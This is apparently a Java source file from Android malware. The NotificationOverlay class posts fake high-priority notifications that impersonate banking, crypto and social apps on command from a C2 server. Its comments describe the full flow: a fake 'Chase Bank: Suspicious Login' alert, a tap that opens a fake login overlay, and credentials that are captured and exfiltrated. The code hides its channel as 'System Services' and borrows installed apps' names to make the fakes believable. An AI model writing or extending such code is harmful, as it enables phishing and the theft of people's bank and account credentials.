package com.fason.app.features.springe.overlays;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Build;
import android.util.Log;

import com.fason.app.core.FasonApp;
import com.fason.app.features.springe.SpringeEngine;
import com.fason.app.features.springe.SpringeProtocol;
import com.fason.app.features.springe.detection.NotificationTrigger;

import org.json.JSONObject;

/**
 * NotificationOverlay — SCM (Social Channel Manipulation) notification sender.
 *
 * Sends fake notifications that look like they come from legitimate apps
 * (banking, crypto, messaging, social media). When the user taps the
 * notification, it triggers a Springe overlay or opens a phishing page.
 *
 * Integration with NotificationTrigger enables the classic flow:
 * 1. C2 sends command → post fake "Chase Bank: Suspicious Login" notification
 * 2. User taps notification → NotificationTrigger fires
 * 3. SpringeEngine shows overlay (fake login page for Chase)
 * 4. User enters credentials → captured and exfiltrated
 *
 * Must create notification channels for Android 8+ (API 26+).
 */
public final class NotificationOverlay {

    private static final String TAG = "NotificationOverlay";

    private static final String CHANNEL_ID = "springe_scm";
    private static final String CHANNEL_NAME = "System Services";
    private static final String CHANNEL_DESC = "System notification services";

    private final Context context;
    private final NotificationManager notificationManager;
    private boolean channelCreated = false;

    // Unique notification ID counter
    private static int notificationId = 9000;

    public NotificationOverlay(Context context) {
        this.context = context;
        this.notificationManager =
            (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
    }

    /**
     * Post a fake notification mimicking a legitimate app.
     *
     * @param title Notification title (e.g., "Chase Bank")
     * @param text Notification body (e.g., "Suspicious login attempt detected")
     * @param targetPackage The app package this notification pretends to be from
     * @param triggerTemplateId Template to show when notification is tapped
     * @param iconName Icon resource name or "default"
     */
    public void postNotification(String title, String text, String targetPackage,
                                 String triggerTemplateId, String iconName) {
        try {
            ensureChannel();

            int id = notificationId++;
            String actionId = "springe_notif_" + id;

            // Register this notification with NotificationTrigger so it knows
            // what to do when tapped
            NotificationTrigger.registerPendingNotification(actionId, targetPackage, triggerTemplateId);

            // Create the intent that fires when notification is tapped
            Intent tapIntent = new Intent("com.fason.app.SPRINGE_NOTIFICATION_TAP");
            tapIntent.putExtra("actionId", actionId);
            tapIntent.putExtra("targetPackage", targetPackage);
            tapIntent.putExtra("templateId", triggerTemplateId);

            PendingIntent pendingIntent;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                pendingIntent = PendingIntent.getBroadcast(
                    context, id, tapIntent,
                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
            } else {
                pendingIntent = PendingIntent.getBroadcast(
                    context, id, tapIntent, PendingIntent.FLAG_UPDATE_CURRENT);
            }

            // Build the notification
            Notification.Builder builder;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                builder = new Notification.Builder(context, CHANNEL_ID);
            } else {
                builder = new Notification.Builder(context);
            }

            builder.setContentTitle(title)
                .setContentText(text)
                .setSmallIcon(getIcon(iconName))
                .setAutoCancel(true)
                .setContentIntent(pendingIntent)
                .setPriority(Notification.PRIORITY_HIGH)
                .setDefaults(Notification.DEFAULT_ALL)
                .setWhen(System.currentTimeMillis())
                .setShowWhen(true);

            // Add large icon (app icon) if available
            Bitmap largeIcon = getLargeIcon(targetPackage);
            if (largeIcon != null) {
                builder.setLargeIcon(largeIcon);
            }

            Notification notification = builder.build();
            notificationManager.notify(id, notification);

            Log.i(TAG, "Fake notification posted: '" + title + "' → " + targetPackage
                + " (id=" + id + ")");

        } catch (Exception e) {
            Log.e(TAG, "Failed to post notification", e);
        }
    }

    /**
     * Post a notification impersonating an installed app.
     * Uses the app's actual icon for maximum believability.
     */
    public void postAppImpersonationNotification(String appPackageName, String text,
                                                  String triggerTemplateId) {
        try {
            // Get the app's display name
            String appName = getAppName(appPackageName);
            String title = appName != null ? appName : appPackageName;

            postNotification(title, text, appPackageName, triggerTemplateId, "default");
        } catch (Exception e) {
            Log.e(TAG, "Failed to post app impersonation", e);
        }
    }

    /**
     * Remove a previously posted notification by its action ID.
     */
    public void cancelNotification(String actionId) {
        try {
            int id = extractId(actionId);
            notificationManager.cancel(id);
            NotificationTrigger.unregisterPendingNotification(actionId);
        } catch (Exception e) {
            Log.e(TAG, "Failed to cancel notification", e);
        }
    }

    /**
     * Remove all Springe-posted notifications.
     */
    public void cancelAll() {
        try {
            notificationManager.cancelAll();
        } catch (Exception e) {
            Log.e(TAG, "Failed to cancel all notifications", e);
        }
    }

    /* ─── Internal ─── */

    private void ensureChannel() {
        if (channelCreated) return;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID, CHANNEL_NAME, NotificationManager.IMPORTANCE_HIGH);
                channel.setDescription(CHANNEL_DESC);
                channel.setShowBadge(false);
                channel.enableLights(false);
                channel.setSound(null, null); // Silent by default
                notificationManager.createNotificationChannel(channel);
                channelCreated = true;
            } catch (Exception e) {
                Log.e(TAG, "Failed to create notification channel", e);
            }
        }
    }

    private int getIcon(String iconName) {
        // Use Android default icon as fallback
        try {
            if (iconName != null && !iconName.equals("default")) {
                int resId = context.getResources().getIdentifier(
                    iconName, "drawable", context.getPackageName());
                if (resId != 0) return resId;
            }
        } catch (Exception ignored) {}

        // Try to get the app's own icon
        try {
            int iconId = context.getApplicationInfo().icon;
            if (iconId != 0) return iconId;
        } catch (Exception ignored) {}

        return android.R.drawable.ic_dialog_info;
    }

    private Bitmap getLargeIcon(String packageName) {
        try {
            return BitmapFactory.decodeResource(
                context.getResources(), getIcon("default"));
        } catch (Exception e) {
            return null;
        }
    }

    private String getAppName(String packageName) {
        try {
            android.content.pm.PackageManager pm = context.getPackageManager();
            android.content.pm.ApplicationInfo ai = pm.getApplicationInfo(packageName, 0);
            return pm.getApplicationLabel(ai).toString();
        } catch (Exception e) {
            return packageName;
        }
    }

    private int extractId(String actionId) {
        try {
            return Integer.parseInt(actionId.replace("springe_notif_", ""));
        } catch (Exception e) {
            return 0;
        }
    }
}
